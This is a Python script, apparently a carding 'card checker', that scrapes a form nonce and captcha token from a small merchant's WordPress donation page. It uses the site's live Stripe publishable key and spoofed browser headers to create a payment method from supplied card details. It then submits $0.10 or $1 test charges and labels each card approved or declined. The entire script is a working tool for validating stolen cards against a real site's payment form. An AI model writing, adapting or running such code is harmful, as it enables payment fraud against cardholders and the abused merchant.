# ========== 0.10 $ STRIPE CHARGE – ENTegre  ==========
FLOW_DATA = {"010": {}, "1dollar": {}}

def refresh_flow():
    try:
        r = requests.get("https://allcoughedup.com/registry/", timeout=10)
        nonce = re.search(r'_fluentform_4_fluentformnonce["\']\s+value=["\']([^"\']+)', r.text).group(1)
        captcha = re.search(r'"hcaptcha_token"\s*:\s*"([^"]+)"', r.text).group(1)
        FLOW_DATA["010"]["nonce"] = FLOW_DATA["1dollar"]["nonce"] = nonce
        FLOW_DATA["010"]["captcha"] = FLOW_DATA["1dollar"]["captcha"] = captcha
        FLOW_DATA["010"]["amount"] = "0.1"
        FLOW_DATA["1dollar"]["amount"] = "1"
        return True
    except Exception as e:
        print("Flow refresh hatası:", e)
        return False

def stripe_010(cn: str, em: str, ey: str, cvc: str):
    if not refresh_flow():
        return {"status": "declined", "msg": "Nonce refresh failed"}
    fd = FLOW_DATA["010"]
    hdr = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; 23053RN02A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    }
    data = (
        f"type=card&card[number]={cn}&card[cvc]={cvc}&card[exp_month]={em}&card[exp_year]={ey}"
        f"&guid=f7976440-68ec-49d1-952d-9889071b4b5b1f984e&muid=be981b40-1455-45ad-8878-ab3e4e2c179ab79b99"
        f"&sid=e4704920-3a9f-4d51-98ae-3bb1af14e2113b87c8&payment_user_agent=stripe.js%2Fcba9216f35"
        f"%3B+stripe-js-v3%2Fcba9216f35%3B+card-element&referrer=https%3A%2F%2Fallcoughedup.com"
        f"&time_on_page=116055&client_attribution_metadata[client_session_id]=84981881-bf50-4d1d-8e36-36045f430d83"
        f"&client_attribution_metadata[merchant_integration_source]=elements"
        f"&client_attribution_metadata[merchant_integration_subtype]=card-element"
        f"&client_attribution_metadata[merchant_integration_version]=2017"
        f"&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV"
        f"&radar_options[hcaptcha_token]={fd['captcha']}"
    )
    try:
        r1 = requests.post("https://api.stripe.com/v1/payment_methods", headers=hdr, data=data, timeout=10)
        r1.raise_for_status()
        pm_id = r1.json()["id"]
    except Exception as e:
        return {"status": "declined", "msg": "PM create failed"}

    cookies = {
        "__stripe_mid": "be981b40-1455-45ad-8878-ab3e4e2c179ab79b99",
        "__stripe_sid": "e4704920-3a9f-4d51-98ae-3bb1af14e2113b87c8",
    }
    hdr2 = {
        "authority": "allcoughedup.com",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://allcoughedup.com",
        "referer": "https://allcoughedup.com/registry/",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; 23053RN02A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    params = {"t": str(int(time.time() * 1000))}
    payload = (
        "data=" + requests.utils.quote(
            f"__fluent_form_embdbd_post_id=3612&_fluentform_4_fluentformnonce={fd['nonce']}&_wp_http_referer=%2Fregistry%2F"
            f"&names%5Bfirst_name%5D=BabaPro&email=sikimleyuxles%40gmail.com&custom-payment-amount={fd['amount']}"
            f"&description=Abilere%20Selam&payment_method=stripe&__entry_intermediate_hash=926d8a16c1d118dd6a627821eeae442b"
            f"&__stripe_payment_method_id={pm_id}"
        ) + "&action=fluentform_submit&form_id=4"
    )
    try:
        r2 = requests.post(
            "https://allcoughedup.com/wp-admin/admin-ajax.php",
            params=params, cookies=cookies, headers=hdr2, data=payload, timeout=15
        )
        if r2.ok and "success" in r2.text.lower():
            return {"status": "approved", "msg": "Payment successful"}
        else:
            return {"status": "declined", "msg": "Your card was declined"}
    except Exception as e:
        return {"status": "declined", "msg": "Your card was declined"}
